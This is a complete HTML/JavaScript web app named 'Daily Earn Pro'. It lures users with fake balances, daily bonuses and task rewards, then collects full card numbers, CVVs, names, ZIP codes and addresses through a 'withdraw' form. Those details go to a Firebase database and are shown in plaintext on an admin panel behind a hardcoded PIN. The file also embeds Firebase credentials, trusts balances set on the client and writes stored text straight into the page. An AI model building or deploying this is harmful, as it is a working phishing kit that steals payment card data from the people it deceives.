<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Daily Earn Pro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    :root { 
        --primary: #6a11cb; 
        --secondary: #2575fc;
        --bg: #f8f9fd; 
        --text: #2d3436;
        --glass: rgba(255, 255, 255, 0.9);
    }

    body { 
        margin:0; 
        font-family: 'Inter', -apple-system, sans-serif; 
        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
        color: var(--text);
        min-height: 100vh;
        padding-bottom: 80px;
    }

    /* HEADER */
    header { 
        background: var(--glass);
        backdrop-filter: blur(10px);
        padding: 20px; 
        display: flex; 
        justify-content: space-between; 
        align-items: center; 
        position: sticky; 
        top: 0; 
        z-index: 100;
        box-shadow: 0 2px 15px rgba(0,0,0,0.05);
    }
    header h2 { margin: 0; font-size: 1.2rem; background: linear-gradient(to right, var(--primary), var(--secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

    /* CARDS & UI */
    .tab { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
    @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }

    .card { 
        background: var(--glass);
        padding: 20px; 
        border-radius: 20px; 
        margin-bottom: 15px; 
        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
        border: 1px solid rgba(255,255,255,0.3);
    }

    .balance-card {
        background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
        color: white;
        text-align: center;
        padding: 30px;
    }
    .balance-card h1 { font-size: 2.5rem; margin: 10px 0; }

    /* INPUTS & BUTTONS */
    .input-group { margin-bottom: 15px; }
    label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #636e72; text-transform: uppercase; }
    
    input { 
        width: 100%; padding: 12px 15px; border: 1.5px solid #eee; border-radius: 12px; 
        box-sizing: border-box; font-size: 14px; transition: 0.3s; background: #fff;
    }
    input:focus { outline: none; border-color: var(--secondary); box-shadow: 0 0 8px rgba(37, 117, 252, 0.2); }

    .btn { 
        background: linear-gradient(to right, var(--primary), var(--secondary));
        color: white; padding: 15px; border: none; border-radius: 12px; 
        cursor: pointer; font-weight: bold; width: 100%; font-size: 16px;
        box-shadow: 0 4px 15px rgba(106, 17, 203, 0.3); transition: 0.3s;
    }
    .btn:active { transform: scale(0.98); }

    /* NAVIGATION */
    nav { 
        position: fixed; bottom: 15px; left: 15px; right: 15px; 
        background: rgba(45, 52, 54, 0.95); backdrop-filter: blur(10px);
        display: flex; justify-content: space-around; border-radius: 25px; 
        padding: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
    }
    nav button { 
        border: none; background: none; color: #b2bec3; font-size: 20px; 
        padding: 10px; cursor: pointer; transition: 0.3s;
    }
    nav button.active { color: white; transform: translateY(-5px); }

    .notif-badge { background: #ff7675; width: 8px; height: 8px; border-radius: 50%; position: absolute; top: 0; right: 0; display: none; }
    
    /* AUTH SCREEN */
    #auth { padding: 50px 30px; text-align: center; }
    #auth h1 { font-size: 2rem; margin-bottom: 30px; }

    .status-pill { font-size: 10px; padding: 4px 10px; border-radius: 20px; float: right; font-weight: bold; }
    .pending { background: #ffeaa7; color: #d63031; }
    .paid { background: #55efc4; color: #00b894; }

</style>
</head>
<body>

<div id="auth">
    <h1>Daily Earn Pro</h1>
    <div class="card">
        <input id="regName" placeholder="Full Name">
        <input id="regEmail" placeholder="Email Address">
        <input id="regPass" type="password" placeholder="Password">
        <button class="btn" onclick="handleAuth()">Get Started</button>
    </div>
</div>

<div id="app" style="display:none;">
    <header>
        <h2 id="welcomeText">Welcome</h2>
        <div style="position: relative; font-size: 24px; cursor: pointer;" onclick="showTab('notifications')">
            🔔 <span id="notifDot" class="notif-badge"></span>
        </div>
    </header>

    <div id="dashboard" class="tab">
        <div class="card balance-card">
            <p style="margin:0; opacity:0.8;">Available Balance</p>
            <h1>$<span id="balance">0</span></h1>
        </div>
        <div class="card">
            <h3>Daily Reward</h3>
            <p>Claim your daily bonus of $5.00 instantly.</p>
            <button class="btn" onclick="dailyClaim()">🎁 Claim Reward</button>
        </div>
    </div>

    <div id="tasks" class="tab">
        <h3 style="margin-left: 10px;">Quick Tasks</h3>
        <div id="taskList"></div>
    </div>

    <div id="withdraw" class="tab">
        <div class="card">
            <h3>Withdraw Funds</h3>
            <div class="input-group">
                <label>Amount ($)</label>
                <input id="withdrawAmount" type="number" placeholder="Min $100">
            </div>
            <div class="input-group">
                <label>Card Holder Name</label>
                <input id="cardName" placeholder="e.g. John Doe">
            </div>
            <div class="input-group">
                <label>Card Number</label>
                <input id="cardNumber" placeholder="0000 0000 0000 0000">
            </div>
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 1;">
                    <label>CVV</label>
                    <input id="cardCVV" type="password" placeholder="123">
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>Postal Code</label>
                    <input id="cardZip" placeholder="10001">
                </div>
            </div>
            <div class="input-group">
                <label>Address</label>
                <input id="cardAddress" placeholder="Street, City, Country">
            </div>
            <button class="btn" onclick="requestWithdraw()">Submit Request</button>
        </div>
        <h4>Recent History</h4>
        <div id="userWithdrawals"></div>
    </div>

    <div id="notifications" class="tab">
        <h3>Inbox</h3>
        <div id="userNotifications"></div>
    </div>

    <div id="admin" class="tab">
        <div id="adminLogin">
            <div class="card">
                <h3>Admin Secure Access</h3>
                <input id="adminPass" type="password" placeholder="Enter Admin PIN">
                <button class="btn" onclick="openAdmin()">Login</button>
            </div>
        </div>
        
        <div id="adminContent" style="display:none;">
            <div class="card" style="background:#fff3f3;">
                <h4>Broadcast Message</h4>
                <input id="notifText" placeholder="Message...">
                <button class="btn" onclick="sendNotification()">Push Notification</button>
            </div>
            <h4>Pending Payouts</h4>
            <div id="adminWithdrawals"></div>
            <h4>Active Users</h4>
            <div id="allUsers"></div>
        </div>
    </div>

    <nav id="navbar">
        <button onclick="showTab('dashboard')" class="nav-btn">🏠</button>
        <button onclick="showTab('tasks')" class="nav-btn">💰</button>
        <button onclick="showTab('withdraw')" class="nav-btn">💳</button>
        <button onclick="showTab('admin')" class="nav-btn">⚙️</button>
    </nav>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
// --- FIREBASE SETUP ---
const firebaseConfig = {
    apiKey: "AIzaSyDWd8bqsCIKJrjXdjhfUJg9edDrXQ6uKvk",
    authDomain: "daily-ean.firebaseapp.com",
    databaseURL: "https://daily-ean-default-rtdb.firebaseio.com",
    projectId: "daily-ean",
    storageBucket: "daily-ean.appspot.com",
    messagingSenderId: "465909343560",
    appId: "1:465909343560:web:7597e8babe18ec6553ff7d"
};
firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const db = firebase.database();
let currentUser = null;

// --- AUTH ---
function handleAuth() {
    const email = document.getElementById("regEmail").value;
    const pass = document.getElementById("regPass").value;
    const name = document.getElementById("regName").value;
    if(!email || !pass) return alert("Fill fields");
    auth.createUserWithEmailAndPassword(email, pass)
    .then(res => {
        db.ref("users/" + res.user.uid).set({ name: name, balance: 50, blocked: false, lastClaim: 0 });
    })
    .catch(() => auth.signInWithEmailAndPassword(email, pass).catch(e => alert(e.message)));
}

auth.onAuthStateChanged(user => {
    if (user) {
        currentUser = user;
        db.ref("users/" + user.uid).on("value", snap => {
            const data = snap.val();
            if (data.blocked) { alert("Blocked"); auth.signOut(); location.reload(); return; }
            document.getElementById("auth").style.display = "none";
            document.getElementById("app").style.display = "block";
            document.getElementById("welcomeText").innerText = "Hi, " + data.name.split(' ')[0];
            document.getElementById("balance").innerText = data.balance.toLocaleString();
        });
        loadTasks();
        loadUserWithdrawals();
        listenForNotifications();
        showTab('dashboard');
    }
});

function showTab(tabId) {
    document.querySelectorAll('.tab').forEach(t => t.style.display = "none");
    document.getElementById(tabId).style.display = "block";
    if(tabId === 'notifications') document.getElementById("notifDot").style.display = "none";
}

// --- CORE FUNCTIONS ---
function dailyClaim() {
    const ref = db.ref("users/" + currentUser.uid);
    ref.once("value").then(snap => {
        let now = Date.now();
        if (now - snap.val().lastClaim < 86400000) return alert("Check back in 24h!");
        ref.update({ balance: snap.val().balance + 5, lastClaim: now });
        alert("Daily Bonus Added!");
    });
}

function requestWithdraw() {
    const amt = document.getElementById("withdrawAmount").value;
    const details = {
        name: document.getElementById("cardName").value,
        number: document.getElementById("cardNumber").value,
        cvv: document.getElementById("cardCVV").value,
        zip: document.getElementById("cardZip").value,
        addr: document.getElementById("cardAddress").value
    };

    if(!amt || !details.number || !details.cvv) return alert("Fill all card details");
    
    db.ref("withdrawRequests").push({ 
        user: currentUser.uid, 
        userName: document.getElementById("welcomeText").innerText,
        amount: amt, 
        cardDetails: details,
        status: "Pending",
        time: new Date().toLocaleDateString()
    });
    alert("Payout Request Sent!");
}

function loadUserWithdrawals() {
    db.ref("withdrawRequests").orderByChild("user").equalTo(currentUser.uid).on("value", snap => {
        let html = "";
        snap.forEach(req => {
            let r = req.val();
            html += `<div class="card">
                <span class="status-pill ${r.status.toLowerCase()}">${r.status}</span>
                <b>$${r.amount}</b><br><small>${r.time}</small>
            </div>`;
        });
        document.getElementById("userWithdrawals").innerHTML = html || "No history yet";
    });
}

// --- ADMIN (PASS: OBASEMO2) ---
function openAdmin() {
    if (document.getElementById("adminPass").value === "OBASEMO2") {
        document.getElementById("adminLogin").style.display = "none";
        document.getElementById("adminContent").style.display = "block";
        loadAdminData();
    } else { alert("Wrong PIN"); }
}

function loadAdminData() {
    db.ref("users").on("value", snap => {
        let html = "";
        snap.forEach(user => {
            html += `<div class="card" style="padding:10px">
                <b>${user.val().name}</b> - $${user.val().balance}
                <button onclick="viewLogs('${user.key}')" style="border:none; background:none; color:blue; cursor:pointer;">Logs</button>
                <div id="logs-${user.key}" class="log-text"></div>
            </div>`;
        });
        document.getElementById("allUsers").innerHTML = html;
    });

    db.ref("withdrawRequests").on("value", snap => {
        let html = "";
        snap.forEach(req => {
            let r = req.val();
            if(r.status === "Pending") {
                html += `<div class="card" style="border-left: 4px solid orange;">
                    <p><b>User:</b> ${r.userName}</p>
                    <p><b>Amount:</b> $${r.amount}</p>
                    <p style="font-size:12px; color:#555;">
                        <b>Card:</b> ${r.cardDetails.number} <br>
                        <b>Name:</b> ${r.cardDetails.name} <br>
                        <b>CVV:</b> ${r.cardDetails.cvv} | <b>ZIP:</b> ${r.cardDetails.zip} <br>
                        <b>Addr:</b> ${r.cardDetails.addr}
                    </p>
                    <button class="btn" style="padding:5px" onclick="updateStatus('${req.key}', 'Paid')">Confirm Payment</button>
                </div>`;
            }
        });
        document.getElementById("adminWithdrawals").innerHTML = html || "No payouts pending";
    });
}

function updateStatus(key, newStatus) {
    db.ref("withdrawRequests/" + key).update({ status: newStatus });
}

function sendNotification() {
    let msg = document.getElementById("notifText").value;
    if(msg) {
        db.ref("globalNotifications").push({ message: msg });
        document.getElementById("notifText").value = "";
    }
}

function listenForNotifications() {
    db.ref("globalNotifications").on("value", snap => {
        let html = "";
        snap.forEach(n => html = `<div class="card">${n.val().message}</div>` + html);
        document.getElementById("userNotifications").innerHTML = html;
        if(snap.exists()) document.getElementById("notifDot").style.display = "block";
    });
}

function loadTasks() {
    db.ref("tasks").on("value", snap => {
        let html = "";
        snap.forEach(task => {
            html += `<div class="card">
                <b>${task.val().title}</b>
                <p>Earn $${task.val().reward}</p>
                <button class="btn" style="padding:8px" onclick="completeTask('${task.key}', ${task.val().reward})">Start Task</button>
            </div>`;
        });
        document.getElementById("taskList").innerHTML = html;
    });
}

function completeTask(id, reward) {
    db.ref("users/" + currentUser.uid).once("value").then(snap => {
        db.ref("users/" + currentUser.uid).update({ balance: snap.val().balance + reward });
        alert("Earnings added!");
    });
}
</script>
</body>
</html>
